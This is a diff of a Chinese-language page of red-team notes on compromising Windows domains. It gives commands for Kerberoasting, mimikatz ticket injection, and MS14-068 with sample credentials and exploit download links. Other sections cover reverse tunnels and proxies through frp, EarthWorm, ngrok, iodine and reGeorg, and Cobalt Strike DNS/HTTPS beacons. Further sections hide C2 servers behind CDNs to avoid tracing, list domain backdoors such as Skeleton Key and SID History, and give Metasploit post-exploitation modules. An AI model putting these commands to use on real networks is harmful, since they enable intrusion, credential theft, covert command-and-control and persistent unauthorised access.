+<pre><code>AdFind.exe -b &quot;DC=jun,DC=ss&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/wps1.jpg" alt="img" loading="lazy"></figure>
+<p>查找域中配置非约束委派的主机</p>
+<pre><code>1AdFind.exe -b &quot;DC=jun,DC=ss&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
+</code></pre>
+<h5 id="约束委派攻击">约束委派攻击</h5>
+<figure data-type="image" tabindex="14"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712222021426.png" alt="image-20210712222021426" loading="lazy"></figure>
+<h5 id="基于资源的委派攻击">基于资源的委派攻击</h5>
+<h4 id="kerberoast攻击spn扫描">Kerberoast攻击(SPN扫描)</h4>
+<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active  Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>
 <pre><code>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。
 
 
@@ -541,8 +563,7 @@ setspn -q */* | findstr &quot;MSSQL&quot;
 <p>2）请求获取票据</p>
 <p>删除缓存票据</p>
 <pre><code>klist purge
-</code></pre>
-<pre><code>第一种 powershell请求
+第一种 powershell请求
 Add-Type -AssemblyName System.IdentityModel
 
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;
@@ -572,17 +593,67 @@ mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
 <p>6）利用</p>
 <pre><code>dir //xxx.xxx.xxx.xxx/c$
 </code></pre>
-<h3 id="案例14-sam文件hash值获取">案例14-sam文件hash值获取</h3>
-<pre><code>privilege::debug
-token::elevate
-lsadump::sam
+<h4 id="ntlm-relay">NTLM Relay</h4>
+<pre><code>原理：诱骗受害者访问沦陷主机（我们获得NTLM）
 </code></pre>
+<h4 id="as-rep-rosating攻击">AS-REP Rosating攻击</h4>
+<h3 id="dcshadow">DCshadow</h3>
+<p>让域控复制伪造域控的内容</p>
+<p><a href="https://zhuanlan.zhihu.com/p/37782341">域渗透：DCShadow攻击与利用 - 知乎 (zhihu.com)</a></p>
+<h3 id="cve常用漏洞">CVE常用漏洞</h3>
+<h4 id="cve-2014-6324">CVE-2014-6324</h4>
+<p>powershell执行</p>
+<p>能实现普通用户直接获取域控system权限</p>
+<pre><code>1.查看当前sid 
+whoami/user
+2.清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
+mimikatz # kerberos::purge         // 清空当前机器中所有凭证
+mimikatz # kerberos::list          // 查看当前机器凭证
+mimikatz # kerberos::ptc 票据文件   // 将票据注入到内存中
+3.利用ms14-068生成TGT数据 
+ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
+MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
+4.票据注入内存
+mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit
+5.查看凭证列表 
+klist
+6.利用  
+dir \\192.168.3.21\c$
+</code></pre>
+<p>MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
+<p>利用工具kekeo</p>
+<p>工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases</p>
+<pre><code>1.生成票据
+kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;
+2.导入票据
+kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
+3.查看凭证 klist
+4.利用net use载入
+dir \\192.168.3.21\c$
+</code></pre>
+<h4 id="cve-2019-1040">CVE-2019-1040</h4>
+<h4 id="cve-2019-0708">CVE-2019-0708</h4>
+<p><strong>漏洞影响版本</strong></p>
+<pre><code>Windows 7
+Windows server 2008 R2
+Windows server 2008
+Windows 2003
+Windows xp
+
+注:Windows 8和windows10以及之后的版本不受此漏洞影响
+</code></pre>
+<p>RDP远程控制</p>
+<pre><code>exp
+https://www.cnblogs.com/qianxiao996/p/13574576.html
+exp
+https://github.com/k8gege/CVE-2019-0708
+</code></pre>
+<h4 id="cve-2020-1472常用">CVE-2020-1472（常用）</h4>
+<p>域内提权（域内的普通用户直接获取对于域控服务器的控制）</p>
+<p><a href="https://blog.csdn.net/adminuil/article/details/108858398">(7条消息) CVE-2020-1472复现（域内提权）_adminuil的博客-CSDN博客</a></p>
 <h2 id="代理技术">代理技术</h2>
-<pre><code>解决内网通信问题
-</code></pre>
-<h3 id="案例1-内网穿透ngrok测试演示-两个内网通讯上线">案例1-内网穿透Ngrok测试演示-两个内网通讯上线</h3>
+<h3 id="ngrok">Ngrok</h3>
 <p>链接：<code>ngrok.cc</code></p>
-<p>kali</p>
 <pre><code>./sunny clientid aa0676878c162ffc 
 </code></pre>
 <p>生成木马(基于http协议)</p>
@@ -593,9 +664,8 @@ set lhost 192.168.76.132
 set lport 4444
 exploit
 </code></pre>
-<h3 id="案例2-内网穿透frp自建跳板测试-两个内网通讯上线">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</h3>
+<h3 id="gofrp">gofrp</h3>
 <p>链接：<code>gofrp.org</code></p>
-<p>kali</p>
 <pre><code>服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）
 服务器修改配置文件frps.ini：
  [common]
@@ -621,7 +691,7 @@ exploit
  local_port = 5555          #转发给本机的5555
  remote_port = 6000         #服务端用6000端口转发给本机
 </code></pre>
-<h3 id="案例3-socks代理技术ew工具">案例3-Socks代理技术（ew工具）</h3>
+<h3 id="socks代理技术ew工具">Socks代理技术（ew工具）</h3>
 <p>教程:  <a href="http://www.yunweipai.com/39315.html">内网渗透之代理转发 – 运维派 (yunweipai.com)</a></p>
 <p>工具：https://github.com/idlefire/ew</p>
 <p>环境一（公网攻击机-内网映射公网服务）</p>
@@ -632,9 +702,9 @@ exploit
 <p>公网服务器</p>
 <pre><code class="language-text">./ew_for_linux64 -s rssocks -d 192.168.1.124 -e 1099&amp;
 </code></pre>
-<h3 id="案例4-socks反向代理技术gofrp工具">案例4-socks反向代理技术（gofrp工具）</h3>
-<p><code>注意#号在配置文件中不是注释</code></p>
-<h2 id="隧道技术">隧道技术</h2>
+<h3 id="socks反向代理技术gofrp工具">socks反向代理技术（gofrp工具）</h3>
+<pre><code>注意#号在配置文件中不是注释
+</code></pre>
 <pre><code>必备知识点：
  1.代理和隧道技术区别?
  2.隧道技术为了解决什么?
@@ -655,8 +725,7 @@ bind_port = 7002
 token = 1q2w3e
 heartbeat_timeout = 90
 max_pool_count = 5
-</code></pre>
-<pre><code>运行下列命令
+运行下列命令
 ./frps -c frps.ini 
 </code></pre>
 <p>沦陷靶机</p>
@@ -676,11 +745,50 @@ use_encryption = true
 use_compression = true
 plugin_user = admin					
 plugin_passwd = 123					
+./frpc -c frpc.ini
+</code></pre>
+<h3 id="meterpreter">meterpreter</h3>
+<pre><code>Options：选项
+-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。
+-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。
+-p：TCP连接将转发到的端口。
+-r：连接被中继到的IP地址（目标）。
+查看列表
+portfwd List
+清空列表
+portfwd flush
+</code></pre>
+<p>端口转发</p>
+<pre><code> portfwd add –l 3389 –p 3389 –r 172.16.194.141
+</code></pre>
+<p>路由技术</p>
+<pre><code>（全局）
+获取路由        run get_local_subnets
+添加路由		route add 0.0.0.0 0.0.0.0 sessionid
+打印路由		route print 
+
+（meterpreter）
+run autoroute -s 192.168.11.0/24
+run autoroute -p 						#查看路由的添加情况
+</code></pre>
+<h3 id="路由转发技术">路由转发技术</h3>
+<p>netsh(windows)本地端口转发</p>
+<pre><code>netsh interface portproxy add v4tov4 listenaddress=100.100.10.14 listenport=2222 connectaddress=192.168.10.129 connectport=22   
+
+#监听100.100.10.14的2222端口，映射到192.168.10.129 的22端口上
+</code></pre>
+<p>iptables(linux)本地端口转发</p>
+<pre><code>开启数据转发功能：/etc/sysctl.conf  设置 net.ipv4.ip_forward=1
+
+iptables -t nat -L         #查看端口转发记录
+iptables -t nat -A PREROUTING -d 192.168.10.21 -p tcp --dport 2222 -j DNAT --to-destination 192.168.10.21:22           #将192.168.10.21的2222端口的流量都转发给192.168.10.21的22端口
+iptables -save             #保存
+iptables -t nat -F         #清除规则
+做本地端口转发，将本地2222端口的流量转发给22端口
 
 </code></pre>
-<pre><code>./frpc -c frpc.ini
-</code></pre>
-<h3 id="案例1-网络传输应用层检测连通性-检测">案例1-网络传输应用层检测连通性-检测</h3>
+<h2 id="隧道技术">隧道技术</h2>
+<h3 id="检测连通性">检测连通性</h3>
 <pre><code>1. TCP 协议
     用“瑞士军刀”——netcat
     执行 nc 命令：nc  &lt;端口&gt;
@@ -693,7 +801,7 @@ plugin_passwd = 123
     nslookup 是windows自带的DNS探测命令
     dig是linux系统自带的DNS探测命令
 </code></pre>
-<h3 id="案例2-网络层icmp隧道ptunnel使用隧道技术">案例2-网络层ICMP隧道ptunnel使用(隧道技术)</h3>
+<h3 id="icmp隧道">ICMP隧道</h3>
 <p>pingtunnel</p>
 <pre><code>tcp/udp/sock5流量伪装成icmp流量进行转发的工具
  -p  ##表示连接icmp隧道另一端的机器IP（即目标服务器）
@@ -711,20 +819,22 @@ rdesktop 127.0.0.1 1080
 </code></pre>
 <p>老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)<br>
 新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)</p>
-<h3 id="案例3-传输层转发隧道portmap使用">案例3-传输层转发隧道Portmap使用</h3>
-<pre><code>windows: lcx
-linux：portmap
-lcx -slave 攻击IP 3131 127.0.0.1 3389 //将本地3389给攻击IP的3131
-lcx -listen 3131 3333 //监听3131转发至3333
+<h3 id="dns隧道">DNS隧道</h3>
+<pre><code>目标机
+    iodine -f -r 192.168.0.1 test.com。替换192.168.0.1为服务器的IP地址。
+阿里云域名解析
+    域名解析
+      A记录
+        设置一个子域名的DNS服务器地址
+          服务器地址指向我们的KALI
+      NS记录
+        添加一个子域名
+
+在您的服务器上，运行：./iodined -f 10.0.0.1 test.com。如果您已经在使用10.0.0.0网络，请使用另一个内部网络，如 172.16.0.0。
+
+iodine工具：https://github.com/yarrick/iodine
 </code></pre>
-<p>windows自带</p>
-<pre><code>将来自333端口的流量全部转发到192.168.191.130的3389端口
-netsh interface portproxy add v4tov4 listenport=333 connectaddress=192.168.191.130 connectport=3389
-netsh interface portproxy show all 查看所有转发规则
-netsh interface portproxy delete v4tov4 listenport=333 删除转发规则
-netsh interface portproxy reset 清除所有规则
-</code></pre>
-<h3 id="案例4-应用层dns隧道配合cs上线">案例4-应用层DNS隧道配合CS上线</h3>
+<h4 id="应用层dns隧道配合cs上线">应用层DNS隧道配合CS上线</h4>
 <p>https://www.freebuf.com/articles/web/256032.html</p>
 <p>https://zhuanlan.zhihu.com/p/90806965</p>
 <p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
@@ -734,17 +844,17 @@ netsh interface portproxy reset 清除所有规则
  NS记录-&gt;ns1主机名-&gt;上个A记录地址
  NS记录-&gt;ns2主机名-&gt;上个A记录地址
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224250921.png" alt="image-20210605224250921" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224250921.png" alt="image-20210605224250921" loading="lazy"></figure>
 <p>3.配置DNS监听器内容如下：</p>
 <pre><code> ns1.xiaodi8.com
  ns2.xiaodi8.com
  cs.xiaodi8.com
 </code></pre>
 <p>生产木马</p>
-<figure data-type="image" tabindex="8"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224428694.png" alt="image-20210605224428694" loading="lazy"></figure>
-<figure data-type="image" tabindex="9"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224447100.png" alt="image-20210605224447100" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224428694.png" alt="image-20210605224428694" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224447100.png" alt="image-20210605224447100" loading="lazy"></figure>
 <p>4.生成后门执行上线后启用命令：</p>
-<figure data-type="image" tabindex="10"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605223622250.png" alt="image-20210605223622250" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605223622250.png" alt="image-20210605223622250" loading="lazy"></figure>
 <p>点击黑色的机器右键执行如下命令</p>
 <pre><code> beacon&gt; checkin
  [*] Tasked beacon to checkin
@@ -757,10 +867,7 @@ netsh interface portproxy reset 清除所有规则
  [+] received output:
  xiaodi-pc\xiaodi
 </code></pre>
-<h3 id="案例5-cs的shell-msf的shell">案例5-CS的SHELL-&gt;MSF的SHELL</h3>
-<p>CS-&gt;MSF</p>
-<p>https://blog.csdn.net/qq_39611230/article/details/114498841</p>
-<h3 id="案例6-ssh隧道动态静态端口转发">案例6-SSH隧道（动态/静态端口转发）</h3>
+<h3 id="ssh隧道">SSH隧道</h3>
 <ul>
 <li>本地端口转发：相当于拉数据，本地从跳板机拉取数据（内网拉取外网数据）</li>
 </ul>
@@ -798,57 +905,7 @@ netsh interface portproxy reset 清除所有规则
   // ssh的默认端口是22，改为53是假设防火墙的规则设定的比较死，只允许出站的流量为53的情况下，ssh隧道建立的端口就为53 　　– PasswordAuthentication yes 
   service sshd restart
 </code></pre>
-<h3 id="案例7-dns隧道隧道技术">案例7-DNS隧道（隧道技术）</h3>
-<pre><code>目标机
-    iodine -f -r 192.168.0.1 test.com。替换192.168.0.1为服务器的IP地址。
-阿里云域名解析
-    域名解析
-      A记录
-        设置一个子域名的DNS服务器地址
-          服务器地址指向我们的KALI
-      NS记录
-        添加一个子域名
-
-在您的服务器上，运行：./iodined -f 10.0.0.1 test.com。如果您已经在使用10.0.0.0网络，请使用另一个内部网络，如 172.16.0.0。
-
-iodine工具：https://github.com/yarrick/iodine
-</code></pre>
-<h3 id="案例8-socks代理隧道技术">案例8-socks代理（隧道技术）</h3>
-<p>socks是一种代理服务，可以说是一个升级版的lcx</p>
-<pre><code>socks协议中有交互协议，当访问某个网站的时候，浏览器会把被访问目标的URL和服务端口交给socks服务端进行解析，socks服务端解析后代替浏览器去访问目标网站，将结果返回给浏览器
-端口转发的话是帮忙访问主机的某个端口，一对一，而socks是不需要知道访问哪个端口，一对多
-</code></pre>
-<pre><code>代表工具：EarthWorm（蚯蚓）
-下载连接 https://github.com/rootkiter/EarthWorm
-https://codeload.github.com/idlefire/ew/zip/master
-所有讲内网穿透的，都绕不开这个工具，两大功能：socks5服务端和端口转发，用于网络穿透
-还可以用新版的EW 即Termite    http://rootkiter.com/Termite/
-
-推荐两款流行的工具：ngrok和 frp
-
-比较简洁
-
-frp链接：https://github.com/fatedier/frp
-
-也是有客户端服务端的，和EW一样需要自购VPS搭建，具体命令请参考其他师傅们的文章
-
-ngrok国内链接：http://www.ngrok.cc/　　或者去官网　　https://ngrok.com/
-
-用国内的就好
-
-很方便，不用自己搭服务器了
-
-可以注册账号，花钱买隧道（免费的速度堪忧），傻瓜式操作
-
-如果有隐私方面的考虑不建议使用此方法，可以自建服务器用frp
-
- 
-
- 或者使用nps
-
-参考：https://www.jianshu.com/p/cfbed49e1728
-</code></pre>
-<h3 id="案例9-httphttps协议隧道技术">案例9-HTTP/HTTPS协议（隧道技术）</h3>
+<h3 id="httphttps协议socks隧道">HTTP/HTTPS协议（socks隧道）</h3>
 <p>reGeorg</p>
 <pre><code>reGeorg-----一款正向代理工具，即把代理脚本扔到跳板机上（当然会被杀软干掉的），然后攻击机VPS去连接跳板机
 下载链接   https://github.com/sensepost/reGeorg
@@ -865,8 +922,7 @@ https://cloud.tencent.com/developer/article/1674107
 <pre><code>取得跳板机权限了之后，需要把tunnel.什么什么上传到跳板机上（别忘了要扔到web目录里啊），这个什么，取决于跳板机支持什么语言环境（aspx,jsp,php,ashx)
 
 攻击机VPS上执行　　　　python reGeorgSocksProxy.py -u http://公ip2/tunnel.nosocket.php -p port
-</code></pre>
-<pre><code>话说如果有meterpreter，run get_local_subnets获取网络接口、run autoroute -p 查看路由、run autoroute -s x.x.x.0/24加个路由，
+话说如果有meterpreter，run get_local_subnets获取网络接口、run autoroute -p 查看路由、run autoroute -s x.x.x.0/24加个路由，
 use auxiliary/server/socks4a，set srvport port ,然后按照上面的步骤改proxychains.conf（注意这回用socks4啊，socks4 IP port），也一样能实现将攻击机VPS
 
 “贴”到跳板机上
@@ -876,16 +932,15 @@ use auxiliary/server/socks4a，set srvport port ,然后按照上面的步骤改p
 
  
 </code></pre>
-<h3 id="案例10-https隧道cscdnhttps">案例10-HTTPS隧道（CS+CDN+HTTPS）</h3>
+<h3 id="https隧道cscdnhttps">HTTPS隧道（CS+CDN+HTTPS）</h3>
 <p>文章：https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
 <p>cloudflare</p>
-<figure data-type="image" tabindex="11"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213921268" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213921268" loading="lazy"></figure>
 <p>下载文件</p>
-<figure data-type="image" tabindex="12"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213456387.png" alt="image-20210623213456387" loading="lazy"></figure>
-<figure data-type="image" tabindex="13"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213542566.png" alt="image-20210623213542566" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213456387.png" alt="image-20210623213456387" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213542566.png" alt="image-20210623213542566" loading="lazy"></figure>
 <pre><code>openssl pkcs12 -export -in 1.pem -inkey 1.key -out a.p12 -name cs2.safebug.top -passout pass:123456
-</code></pre>
-<pre><code>keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs2.safebug.top
+keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs2.safebug.top
 </code></pre>
 <p>完成以上两部</p>
 <pre><code>进入cobalt strike目录
@@ -895,101 +950,23 @@ use auxiliary/server/socks4a，set srvport port ,然后按照上面的步骤改p
 重启cs
 </code></pre>
 <p>配置cs</p>
-<figure data-type="image" tabindex="14"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213815134" loading="lazy"></figure>
-<h2 id="转发路由">转发/路由</h2>
-<h3 id="meterpreter">meterpreter</h3>
-<p>帮助</p>
-<pre><code>二、Options：选项
--L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。
--l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。
--p：TCP连接将转发到的端口。
--r：连接被中继到的IP地址（目标）。
-</code></pre>
-<pre><code>查看列表
-portfwd List
-
-清空列表
-portfwd flush
-</code></pre>
-<p>案例-我们将在我们的本地机器上打开一个端口，并让我们的Meterpreter会话在同一端口上向我们的受害者转发连接。我们将使用端口3389，这是远程桌面连接的Windows默认端口。</p>
-<pre><code>端口转发： portfwd add –l 3389 –p 3389 –r 172.16.194.141
-</code></pre>
-<h3 id="路由技术">路由技术</h3>
-<p>获取路由</p>
-<pre><code>run get_local_subnets
-</code></pre>
-<p>全局添加路由</p>
-<pre><code>msfroute add 网段 sessionid
-route print 
-</code></pre>
-<p>session添加路由</p>
-<pre><code>meterpreter &gt; run autoroute -s 192.168.11.0/24
-meterpreter &gt; run autoroute -p 						#查看路由的添加情况
-</code></pre>
-<p>打印路由信息</p>
-<pre><code>route print 
-</code></pre>
-<p>查看路由的添加情况</p>
+<figure data-type="image" tabindex="22"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213815134" loading="lazy"></figure>
 <h2 id="权限维持">权限维持</h2>
-<h3 id="白银票据票据技术">白银票据（票据技术）</h3>
-<h3 id="黄金票据票据技术">黄金票据（票据技术）</h3>
-<h2 id="钓鱼技术">钓鱼技术</h2>
-<p>[钓鱼攻击之远程加载恶意Word模版文件上线CS ]</p>
-<pre><code>https://www.cnblogs.com/zzjdbk/p/14435769.html
-</code></pre>
-<h2 id="保护自己">保护自己</h2>
-<h3 id="一些资料">一些资料</h3>
-<p><strong>CobaltStrike上线隐藏|DNS|CDN|云函数</strong></p>
-<p>https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
-<p>cobalt strike特征隐藏|修改默认端口|去除证书特征|混淆配置</p>
-<p>https://www.ddosi.com/cobalt-strike-bypass/</p>
-<p>隐藏源IP|提高溯源难度|隐藏cobalt strike服务器</p>
-<p>https://www.ddosi.com/c2-hidden/#</p>
-<h3 id="cobalt-strike配置隐藏">cobalt strike配置隐藏</h3>
-<pre><code>1.更改默认端口
-vi teamserver
-
-2.去除证书特征
-Cobalt Strike默认的证书已经是分分钟被逮,所以需要生成一个新的证书
-这里可以用keytool这个工具。操作简单。Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。
-</code></pre>
-<figure data-type="image" tabindex="15"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/1392192-20210520204927340-497762871.png" alt="img" loading="lazy"></figure>
-<p>更换证书</p>
-<h3 id="cobalt-strike域前置技术">cobalt strike（域前置技术）</h3>
-<h3 id="cobalt-strike隐藏技术尽量不使用ip重定向技术">cobalt strike隐藏技术（尽量不使用IP）重定向技术</h3>
-<pre><code>DNS服务器-&gt;外网服务器-&gt;teamserver服务器-&gt;kali
-
-重定向技术
-DNS服务器：r1.cs.com解析ip为外网服务器
-外网服务器:socat转发
-teamserver服务器：接受数据
-</code></pre>
-<h3 id="cobalt-strike隐藏技术尽量不使用ipcdn技术">cobalt strike隐藏技术（尽量不使用IP）CDN技术</h3>
-<p>godaddy设置</p>
-<pre><code>1.购买域名https://dcc.godaddy.com/
-2.DNS域名服务器设置为cloudflare
-</code></pre>
-<figure data-type="image" tabindex="16"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622232348549.png" alt="image-20210622232348549" loading="lazy"></figure>
-<p>cloudflare设置</p>
-<pre><code>1.注册登录账号
-2.添加网站设置CDN
-3.关闭缓存 如下图
-
-Cloudflare有个特点，如果用其他端口的话，是监听不到的
-Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095
-Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443
-</code></pre>
-<figure data-type="image" tabindex="17"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622210736110.png" alt="image-20210622210736110" loading="lazy"></figure>
-<figure data-type="image" tabindex="18"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000719412.png" alt="image-20210623000719412" loading="lazy"></figure>
-<p>cobalt strike设置</p>
-<figure data-type="image" tabindex="19"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000644572.png" alt="image-20210623000644572" loading="lazy"></figure>
-<p>自己的参数</p>
-<pre><code>阿里云服务器：safebug.top cdn
-</code></pre>
-<h3 id="cobalt-strike隐藏技术腾讯云函数技术">cobalt strike隐藏技术（腾讯云函数技术）</h3>
-<h3 id="配置禁止ip访问服务器仅允许cdn的ip">配置禁止IP访问服务器仅允许CDN的IP</h3>
-<pre><code>https://www.bnxb.com/nginx/27638.html
-</code></pre>
+<h3 id="票据技术">票据技术</h3>
+<h4 id="白银票据">白银票据</h4>
+<h4 id="黄金票据">黄金票据</h4>
+<h3 id="委派维持">委派维持</h3>
+<p>非约束委派攻击</p>
+<p>https://www.redteaming.top/2020/02/11/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%88%A9%E7%94%A8</p>
+<p>约束委派攻击</p>
+<p>基于资源约束委派攻击</p>
+<h3 id="sid-history域后门">SID History域后门</h3>
+<p>将administrator的SID添加到恶意用户的SID history属性中</p>
+<p><a href="https://blog.csdn.net/qq_36119192/article/details/104372241">(7条消息) 域控权限持久化之SID History域后门_谢公子的博客-CSDN博客</a></p>
+<h3 id="skeleton-key万能密码">Skeleton Key(万能密码)</h3>
+<p><a href="https://blog.csdn.net/qq_36119192/article/details/104375915">(7条消息) 域控权限持久化之Skeleton Key(万能密码)_谢公子的博客-CSDN博客</a></p>
+<h3 id="dsrm后门">DSRM后门</h3>
+<p><a href="https://blog.csdn.net/qq_36119192/article/details/104371122">(7条消息) 域控权限持久化之DSRM后门_谢公子的博客-CSDN博客</a></p>
 <h2 id="msf后渗透">MSF后渗透</h2>
 <h3 id="meterperter基本系统命令">meterperter基本系统命令</h3>
 <pre><code>background   # 将当前会话放置后台
@@ -1067,6 +1044,10 @@ kiwi_cmd mimikatz命令
 </code></pre>
 <h3 id="msf后渗透模块">MSF后渗透模块</h3>
 <p><a href="https://blog.csdn.net/qq_17204441/article/details/89063425">(12条消息) MSF内网渗透 扫描模块_卿's Blog-CSDN博客</a></p>
+<p>后渗透</p>
+<pre><code>exploit/windows/smb/psexec
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20191215141315915.png" alt="img" loading="lazy"></figure>
 <p>端口扫描端口扫描</p>
 <pre><code>auxiliary/scanner/portscan
 scanner/portscan/ack    ACK防火墙扫描
@@ -1075,150 +1056,226 @@ scanner/portscan/syn    SYN端口扫描
 scanner/portscan/tcp    TCP端口扫描
 scanner/portscan/xmas    TCP&quot;XMas&quot;端口扫描
 </code></pre>
+<p>主机存活探测</p>
+<pre><code>auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
+auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
+auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
+auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活
+</code></pre>
 <p>SMB扫描</p>
-<pre><code>smb枚举auxiliary/scanner/smb/smb_enumusers
-返回DCERPC信息auxiliary/scanner/smb/pipe_dcerpc_auditor
-扫描SMB2协议auxiliary/scanner/smb/smb2
-扫描smb共享文件auxiliary/scanner/smb/smb_enumshares
-枚举系统上的用户auxiliary/scanner/smb/smb_enumusers
-SMB登录auxiliary/scanner/smb/smb_login
-SMB登录use windows/smb/psexec(通过md5值登录)
-扫描组的用户auxiliary/scanner/smb/smb_lookupsid
-扫描系统版本auxiliary/scanner/smb/smb_version
-</code></pre>
-<p>mssql扫描(端口tcp1433udp1434)</p>
-<pre><code>admin/mssql/mssql_enum   MSSQL枚举
-admin/mssql/mssql_exec   MSSQL执行命令
-admin/mssql/mssql_sql   MSSQL查询
-scanner/mssql/mssql_login MSSQL登陆工具
-scanner/mssql/mssql_ping  测试MSSQL的存在和信息
-
-另外还有一个mssql_payload的模块 利用使用的
-</code></pre>
-<p>smtp扫描</p>
-<pre><code>smtp枚举       auxiliary/scanner/smtp/smtp_enum扫描smtp版本   auxiliary/scanner/smtp/smtp_version
-</code></pre>
-<p>snmp扫描</p>
-<pre><code>通过snmp扫描设备auxiliary/scanner/snmp/community
-</code></pre>
-<p>ssh扫描</p>
